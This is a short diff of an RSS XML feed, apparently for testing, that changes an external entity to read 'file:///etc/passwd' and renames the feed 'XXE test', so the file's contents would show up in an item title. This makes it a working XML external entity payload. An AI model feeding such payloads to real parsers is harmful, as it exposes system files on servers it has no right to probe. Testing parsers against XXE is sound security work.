@@ -1,14 +1,14 @@
 <?xml version="1.0" encoding="UTF-8"?>
 
 <!DOCTYPE rss [
-<!ENTITY test SYSTEM "https://therealwisdom-codes.github.io/rss/test.txt">
+<!ENTITY test SYSTEM "file:///etc/passwd">
 ]>
 
 <rss version="2.0">
   <channel>
     <title>RSS Feed</title>
     <link>https://example.com</link>
-    <description>Test feed</description>
+    <description>XXE test</description>
 
     <item>
       <title>&test;</title>
